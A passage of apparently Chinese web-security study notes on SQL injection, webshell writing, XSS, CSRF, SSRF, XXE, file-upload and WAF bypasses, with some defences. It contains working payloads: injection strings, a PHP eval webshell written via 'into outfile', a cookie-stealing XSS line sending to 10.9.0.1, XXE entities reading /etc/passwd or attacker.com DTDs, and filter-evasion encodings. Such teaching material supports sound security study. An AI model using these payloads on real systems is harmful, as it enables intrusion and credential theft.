class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">updatexml（XML_document，XPath_string，<span class="hljs-keyword">new</span><span class="hljs-type">_value</span>）<br>第一个参数：<span class="hljs-keyword">String</span>格式，为XML文档对象的名称<br>第二个参数：Xpath格式的字符串)<br>第三个参数：<span class="hljs-keyword">String</span>格式，替换查找到的符合条件的数据<br><br>作用：改变文档中符合条件的节点的值<br></code></pre></td></tr></table></figure><p>注入示例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,@@datadir),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><ul><li>concat(0x7e,database(),0x7e,user(),0x7e,@@datadir)中间是注入的字符串，这里会爆出数据库、用户信息、目录</li><li>0x7e 是一个十六进制数，表示波浪号字符 “~”，用于分隔要注入的数据。不属于xpath语法格式，因此<strong>报出xpath语法错误</strong></li></ul><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote><p>SQL 盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式</p><p>盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数</p></blockquote><p>盲注攻击攻击者无法从应用程序的响应中直接获取有关数据库结构、表名、列名和数据等敏感信息。应用程序仅仅返回<code>True</code>（页面）和<code>False</code>（页面）。 这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息，但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。</p><p>攻击者可以在应用程序的输入字段中注入嵌套的查询命令或者延迟函数，例如 <code>SELECT SLEEP(5)</code>，并通过分析应用程序的响应时间来推导出查询结果，从而了解数据库的信息。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>如果该查询返回结果，则认证系统将用户“admin”的密码设置为以“a”开头的字符串。攻击者利用这一点可以通过逐一枚举判断密码的每个字符来猜测密码。例如，攻击者可以进行以下尝试：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;b%&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;c%&#x27;</span>;<br>...<br></code></pre></td></tr></table></figure><p>如果查询返回结果，则意味着该字符串以该字符开头</p><h3 id="计时攻击（Time-based-Attack）实现盲注"><a href="#计时攻击（Time-based-Attack）实现盲注" class="headerlink" title="计时攻击（Time-based Attack）实现盲注"></a>计时攻击（Time-based Attack）实现盲注</h3><p>假设目标网站有一个登录表单，用户名和密码将被发送到服务器进行验证。攻击者想要使用注入攻击尝试获取管理员账户的密码，攻击者可以像下面这样构造一个 SQL 查询：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span> <span class="hljs-keyword">AND</span> sleep(<span class="hljs-number">10</span>)<span class="hljs-comment">--&#x27;</span><br></code></pre></td></tr></table></figure><p>在上面的查询中， <code>--&#39;</code> 是注释，它会注销掉查询中的剩余部分，以避免任何其他查询参数引起的错误。查询的 SLEEP() 函数将延迟响应时间，如果结果得到了返回，那么在查询返回之前将会等待10秒钟，那么攻击者就可以推断这个查询是正确的，这意味着在密码字段中的第一个字符是 ‘a’。通过重复这个过程，攻击者可以尝试逐渐猜测密码中的每一个字符，最终获得管理员账户的密码。</p><p><code>benchmark</code> 命令来测试数据库的响应时间，以确定注入语句的有效性和可行性。例如，在 SQL 注入攻击中，攻击者可能会构造一个包含 <code>benchmark</code> 命令的注入语句，例如：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">SELECT benchmark(<span class="hljs-number">1000000</span>, MD5(&#x27;a&#x27;))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>上述语句将执行 100 万次 MD5 加密操作</p><p>⼆分法逐字猜解：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">猜解数据库第一个字符为：d<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),1,1))=100 #</span><br><span class="hljs-string">猜解数据库第二个字符为：v</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">118</span> #<br>猜解数据库第三个字符为：w<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),3,1))=119 #</span><br><span class="hljs-string">猜解数据库第三个字符为：a</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span> #<br><br>注释：<br>substr（str,<span class="hljs-keyword">start</span>,stop）<br>substr截取字符串str,从<span class="hljs-keyword">start</span>开始截取，截取stop个字符<br></code></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>有时候<code>&#39;</code>会被替换为<code>\&#39;</code>以防止我们构造<code>&#39;</code>闭合，从而防止注入</p><p>宽字节注入的意思是，利用GBK编码是宽字节（两个字节构成一个汉字）的特点，绕过<code>\&#39;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; and 1=1--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">%df&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">%</span>df\<span class="hljs-string">&#x27;（单引号会被加上转义字符\）</span><br><span class="hljs-string"></span><br><span class="hljs-string">%df\&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-string">&#x27;（\的十六进制为%5c）</span><br><span class="hljs-string"></span><br><span class="hljs-string">%df%5c&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>縗<span class="hljs-string">&#x27;（GBK编码时会认为这时一个宽字节）</span><br></code></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/qq_18980147/article/details/127502369">https://blog.csdn.net/qq_18980147/article/details/127502369</a></p><h2 id="注入的绕过技巧"><a href="#注入的绕过技巧" class="headerlink" title="注入的绕过技巧"></a>注入的绕过技巧</h2><p>绕过空格</p><ul><li>注释替换空格/**/</li><li>两个空格代替一个空格，用Tab代替空格，%a0=空格</li><li>括号绕过空格：在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。例如：<code>select(user())from dual where(1=1)and(2=2)</code>、<code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></li></ul><p>引号绕过</p><ul><li>将字符替换为十六进制字符串</li></ul><p>双写绕过</p><ul><li>若只过滤1次，则可以双写绕过（写两次则留下一次）</li></ul><p>等号替换为like</p><p>order by替换为into</p><p>and、or、xor</p><ul><li>and 等于&amp;&amp;、or 等于 ||、not 等于 !、xor 等于|</li></ul><p>逗号绕过</p><ul><li>substr(database(),1,1)—&gt; substr(database() from 1 for 1)</li></ul><p>url编码进行绕过</p><ul><li>除了常见的空格字符（%20）外，其他字符也可以用于混淆，如非断行空格（%a0）、制表符（%09）、换行符（%0a）、回车符（%0d）、垂直制表符（%0b）和加号（+）</li></ul><h2 id="sqlmap-–os-shell原理"><a href="#sqlmap-–os-shell原理" class="headerlink" title="sqlmap –os-shell原理"></a>sqlmap –os-shell原理</h2><p>本质上上传了两个PHP文件，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。 另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页url中通过对cmd参数传参执行系统命令</p><h2 id="MySQL写webshell的条件"><a href="#MySQL写webshell的条件" class="headerlink" title="MySQL写webshell的条件"></a>MySQL写webshell的条件</h2><blockquote><p>webshell是一种可以控制和操作网站的恶意代码，通常是一句话木马或者其他脚本语言编写的文件。如果网站存在SQL注入漏洞，攻击者可以利用MySQL数据库的一些特性和函数，将webshell写入到网站的可访问目录中，然后通过客户端工具（如中国菜刀）来连接和执行webshel</p></blockquote><p>MySQL数据库写入webshell的方法:</p><ul><li>使用outfile方法：这是一种MySQL提供的用来写入文件的函数，可以将查询结果或者指定的字符串写入到指定的路径中<code>union select 1,2,3,4,&#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;C:/wamp64/www/work/webshell.php&#39;</code></li></ul><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>数据泄露</li><li>网页篡改</li><li>获取服务器权限（写webshell）</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1632161">MySQL手注之布尔型盲注详解 - 腾讯云开发者社区-腾讯云</a></li></ul><h1 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h1><p>常用的端口扫描和收集工具：</p><ol><li>Nmap：是一个强大的网络端口扫描工具，可以通过各种扫描技术来检测网络上所有活跃的主机和开放的端口，支持多种操作系统。</li><li>Masscan：是一种快速的端口扫描工具，可以在几分钟内在大规模网络中发现并获取所有开放的TCP/UDP端口。</li><li>Zmap：是一个用于快速扫描IPv4网络的开源工具，可以高效地发现并收集目标网络上开放的端口、地址和服务等信息。</li><li>Unicornscan：是一种快速、高度可定制的端口扫描和信息搜集工具，可在较短的时间内检测出目标网络开放的端口和服务。</li><li>Netcat：是一个类Unix平台上的网络通信工具，在渗透测试中可以用于探测目标IP和端口的开放情况，还可以进行端口扫描和漏洞测试等。</li></ol><p>常见高危端口包括：</p><ol><li>21端口：FTP（File Transfer Protocol）服务端口，存在强制入侵、文件注入、文件泄露的风险。</li><li>22端口：SSH（Secure Shell）服务端口，存在强制入侵、提权、木马、远程执行代码的风险。</li><li>23端口：Telnet服务端口，存在强制入侵、远程执行代码、敏感信息泄露的风险。</li><li>80端口：HTTP（Hyper Text Transfer Protocol）服务端口，存在信息泄露、跨站脚本攻击、SQL注入等风险。</li><li>139/445端口：SMB（Server Message Block）服务端口，存在强制入侵、提权、远程执行代码、敏感信息泄露的风险。</li><li>1433端口：SQL Server数据库服务端口，存在SQL注入、提权、远程执行代码、数据泄露等风险。</li><li>3306端口：MySQL数据库服务端口，存在SQL注入、提权、远程执行代码等风险。</li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以在myscripts.js中插入恶意代码，例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;恶意代码已执行！&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>当用户访问包含上述代码的网页时，恶意代码将被执行，弹出一个警告框</p><p>如果攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>XSS攻击可以分为以下几种类型：</p><ol><li>存储型XSS攻击，又称持久型XSS：攻击者将恶意脚本代码存储在Web应用程序的数据库中，当用户访问包含该恶意代码的页面时，恶意代码会被执行。</li><li>反射型XSS攻击，又称非持久型XSS：攻击者将恶意脚本代码作为参数发送给Web应用程序，Web应用程序将该参数反射回给用户，从而执行恶意代码。</li><li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li></ol><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol><li>HTML编码绕过：攻击者通过对恶意脚本代码进行HTML编码，从而绕过应用程序的过滤和验证。</li><li>JavaScript编码绕过：攻击者通过对恶意脚本代码进行JavaScript编码，从而绕过应用程序的过滤和验证。</li><li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li></ol><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ol><li>Unicode编码：攻击者通过对恶意脚本代码进行Unicode编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>\u003Cscript\u003Ealert(&#39;XSS&#39;)\u003C/script\u003E</code>。</li><li>Base64编码：攻击者通过对恶意脚本代码进行Base64编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>PHNjcmlwdD5hbGVydCgnWFMnKTwvc2NyaXB0Pg==</code>。</li><li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li><li>双重编码：攻击者通过对恶意脚本代码进行双重HTML编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E</code>。</li><li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li></ol><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ul><li>使用HTTPOnly Cookie。HTTPOnly Cookie只能通过HTTP协议传输，无法通过JavaScript等脚本语言访问，从而防止恶意脚本代码访问Cookie。这样，即使恶意脚本代码能够注入到网页中，也无法窃取用户的会话信息</li></ul><h1 id="CSFR"><a href="#CSFR" class="headerlink" title="CSFR"></a>CSFR</h1><p>跨站脚本攻击</p><p>原理</p><ul><li>同站请求<ul><li>一个来自example.com的网页向example.com发送请求</li></ul></li><li>跨站请求<ul><li>evil.com向example.com发送请求</li></ul></li></ul><p>假设受害者访问了evil.com，该网页中嵌入了js代码，进行了跨站请求，浏览器在请求发起时附加所有属于example.com的cookies，那么就会造成跨站脚本攻击</p><p>一个get请求示例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=59&quot;</span> </span><br><span class="hljs-tag">            <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>src</code>属性指定一个URL <code>http://www.csrflabelgg.com/action/friends/add?friend=59</code>，它似乎是带有<code>friend</code>参数的HTTP GET请求的URL。如果用户访问了这个页面并且已经登陆到csrflabelgg.com网站，则该 GET 请求会向该网站发送<code>friend=59</code>参数的请求</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li>验证token<ul><li>在每个HTTP请求里附加一部分token信息</li></ul></li><li>Referer标识了请求是从哪里发起的<ul><li>可以通过判断有问题的请求是否是同域下发起的来防御CSRF攻击</li></ul></li><li>可以在header中增加csrf_token</li></ul><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF（Server-side Request Forge）。SSRF是从服务器发出的，那么攻击者可以通过构造恶意的url来访问原本访问不到的内网信息，攻击内网或者本地其他服务</p><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><ul><li>使用 URL 编码（百分号编码）绕过一些常见的限制<ul><li>有些服务器应用程序可能试图限制应用程序向特定的路径发送请求，使用 <code>%2f</code> 替代 <code>/</code> 符号来绕过路径限制，使用 <code>%25</code> 替代 <code>%</code> 符号来绕过百分号编码限制</li><li>使用 <code>%25</code> 替代 <code>%</code> 符号来绕过百分号编码限制</li></ul></li><li>dict协议： dict://serverip:port/命令:参数</li><li>gopher协议：攻击者可以构造恶意的 Gopher URL （使用“gopher://”协议前缀）来发送恶意请求</li><li>File 协议: File 协议是一种用于访问本地文件系统的协议。file:///c:/windows/system32/drivers/etc/hosts</li><li>ip绕过<ul><li>通过各种非HTTP协议（以上</li><li>0.0.0.0这个IP可以饶过正则直接访问到本地</li><li>将 IP 地址转换为十六进制格式，并使用十六进制 IP 地址进行 SSRF 攻击。例如，将 192.168.1.1 转换为 C0A80101</li><li>将 IP 地址转换为逗号分隔的格式。例如，将 192.168.1.1 转换为“192,168,1,1”</li><li>采用进制转换，127.0.0.1 八进制：**<code>0177.0.0.1</code><strong>；十六进制：</strong><code>0x7f.0.0.1</code><strong>；十进制：</strong><code>2130706433</code>**</li><li>利用**<code>[::]</code>，<code>http://[::]:80/</code>** 会解析为 <strong><code>http://127.0.0.1</code></strong></li></ul></li></ul><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></li></ul><h1 id="XXE（XML-外部实体注入-XML-External-Entity-Injection）"><a href="#XXE（XML-外部实体注入-XML-External-Entity-Injection）" class="headerlink" title="XXE（XML 外部实体注入 XML External Entity Injection）"></a>XXE（XML 外部实体注入 XML External Entity Injection）</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>XML 外部实体注入（XML External Entity Injection，简称 XXE）是一种攻击技术，攻击者利用 XML 解析器的漏洞，向应用程序注入恶意的外部实体，从而导致应用程序受到攻击。以下是三个与 XXE 攻击相关的示例：</p><ol><li>在 XML 文档中引用<strong>外部实体</strong>：攻击者可以在 XML 文档中引用一个外部实体，例如一个文件或 URL，然后利用该实体中的内容来执行攻击。例如，攻击者可以在 XML 文档中引用一个包含恶意代码的文件，然后通过解析该文件来执行攻击。</li><li>在 XML 文档中使用<strong>参数实体</strong>：攻击者可以在 XML 文档中使用参数实体，例如 %file;，然后将其定义为一个外部实体，例如 <code>&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>，从而读取敏感文件或执行任意代码。</li><li>在 XML 文档中使用<strong>远程实体</strong>：攻击者可以在 XML 文档中使用远程实体，例如 <code>&lt;!ENTITY file SYSTEM &quot;http://attacker.com/malicious.dtd&quot;&gt;</code>，然后将其定义为一个包含恶意代码的 DTD 文件，从而执行攻击。</li></ol><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ul><li>禁用外部实体的引入</li><li>过滤如SYSTEM等敏感关键字</li></ul><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>文件上传漏洞是一种常见的 Web 应用程序安全漏洞，攻击者可以利用该漏洞上传恶意文件，例如 Web shell、木马程序等，从而获取对目标系统的控制权。其原理如下：</p><ol><li>Web 应用程序通常允许用户<strong>上传文件</strong>，例如图片、文档等。</li><li>攻击者可以通过<strong>构造恶意的上传请求</strong>，例如<strong>修改上传文件的 MIME 类型</strong>、使用特殊的文件名等，来绕过应用程序的上传过滤机制。</li><li>攻击者上传的恶意文件可能包含恶意代码，例如 Web shell、木马程序等，从而使攻击者能够远程控制目标系统。</li></ol><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h2><ul><li>禁用JS实现绕过</li><li>%00，0x00截断<ul><li>比如修改文件名为 <strong>1.php%00.jpg</strong>，如果php 版本&lt;5.3.4  在url中%00表示ascll码的0 ，而ascii码的0，表示字符串结束，所以当url中出现%00时就会认为读取已结束，最后会被解析为 1.php，从而实现绕过</li></ul></li><li>抓包修改MIME类型<ul><li>服务端代码是通过Content-Type的值来判断文件的类型，这样我们可以直接对文件的Content-Type值进行修改来绕过</li></ul></li></ul><h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><ul><li>文件上传的目录设置为不可执行</li><li>采用WAF等安全防护设备</li><li>文件类型采用白名单而不是黑名单，并且综合MIME和后缀判断</li></ul><h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><h2 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h2><ul><li>/usr/s?in/?at /et?/pass?d<ul><li>问号(?)表示通配符，可以替换任意的单个字符（非空），*表示通配符，可以匹配任意长度（包括空）</li></ul></li><li>select/**/from<ul><li>内联注释</li></ul></li><li>字符编码，比如base64</li></ul><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h2><ol><li>Proxy（代理）：使用 Burp Suite Proxy 工具，用户可以<strong>实时拦截和查看浏览器和 Web 服务器之间的请求和响应</strong>。用户可以修改<strong>请求和响应数据</strong>，或者添加自定义数据包到请求或响应中以进行攻击测试。可以使用 <strong>Proxy 代理请求，自定义请求包，检查服务器返回的响应包，进行中间人攻击模拟等等</strong></li><li>Intruder（爆破）：Intruder 是 Burp Suite 内置的一种攻击工具，可以对 Web 应用程序进行高效且精细的自动化攻击，例如暴力破解密码、拒绝服务攻击 (DoS) 等，对应用程序的输入参数集合进行批量测试和攻击，快速发现潜在的安全漏洞。它支持多种不同的攻击方式（如爆破、字典攻击、精确匹配等），支持变量位置标注、多线程并发操作等高级功能。</li><li>Repeater（重发器）：允许测试人员简化测试配置的过程，复制、构建和修改请求信息并发送回服务器，测试不同的测试数据、编写不同的 payload 检查服务器返回的响应，用于重新测试、重新调整和重新验证应用程序的每个模块</li><li>Decoder（解码器）：当我们在一个应用程序中，我们常常会对用户提交的数据进行编码，例如对特殊字符进行 URL 编码、对 HTML / JavaScript 代码进行转义等，因此在测试过程中，我们通常需要先对这些编码过的数据进行解码，然后再进行有效的攻击和漏洞测试。Burp Suite 中的 Decoder 工具可以自动通过多种编码方法（如 Base64、Unicode、URL 编码等）解码请求，以帮助测试人员快速分析和修改潜在的安全漏洞。</li></ol><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><ol><li>-level：用于指定 SQL 注入攻击检测的级别，包括 1（默认）、2、3、4 和 5 级别，级别越高，攻击测试越深入和全面，但同时也会产生更多的虚警或误报。</li><li>-r：用于指定 SQL 注入攻击的目标，例如一个 HTTP 请求报文，从而进行有效的注入测试。可以通过抓包工具捕获 HTTP 请求报文，将其保存至文件并使用 -r 参数指定进行注入测试。</li><li>-u：用于指定一个或多个待测试的目标 URL，这些 URL 通常包含一个或多个 GET 或 POST 参数，可以使用 SQLMap 对这些参数进行 SQL 注入测试。</li><li>–method：用于设置 SQL 注入测试所使用的 HTTP 访问方法，包括 GET、POST、HEAD、PUT、DELETE 等。</li><li>-cookie：用于指定所需的自定义 Cookie，为了通过身份验证过程，可能需要使用有效的 Cookie 值。</li><li>-tamper：用于指定使用什么样的混淆器算法来混淆请求内容，从而更难被检测到。SQLMap 内置了许多常见的混淆器技巧和算法，如括号包含、大小写混淆、注释、字符串串联等。</li></ol><h1 id="中间件及常见漏洞"><a href="#中间件及常见漏洞" class="headerlink" title="中间件及常见漏洞"></a>中间件及常见漏洞</h1><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><p>IIS （Internet Information Services）</p><p>常见的 IIS 解析漏洞包括以下几种：</p><ol><li>目录遍历漏洞：攻击者可以通过构造特定的 URL 查询字符串使 IIS 解析时出现目录遍历，获取到系统敏感文件。</li><li>文件包含漏洞：攻击者可以通过构造恶意链接构造后缀名为 ASP/ASPX/JSP/PHP 的 URL 来注入系统命令，进而导致任意 IP 地址的任意代码执行。</li><li>代码执行漏洞：攻击者利用 IIS 的某些属性或方法执行代码，从而突破应用程序的安全机制。</li></ol><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><ul><li>目录遍历<ul><li>对于 Nginx Web 服务器来说，当 autoindex 参数被设置为 on 时，开启了自动目录索引功能，就容易受到目录遍历漏洞攻击。攻击者可以通过在 URL 中添加 “..” 或 “%2e%2e%2f” 等字符，来访问服务器的任意目录和文件，读取敏感数据或执行远程代码等操作</li></ul></li><li>目录穿越<ul><li>location /foo { alias /bar/; }，如果存在 /foo../ 的请求，会被解析成 /bar/../，经过转化后，即相当于跳出了 /bar/ 目录，从而导致了目录穿越的发生。</li></ul></li></ul><h1 id="Apache-Shiro"><a href="#Apache-Shiro" class="headerlink" title="Apache Shiro"></a>Apache 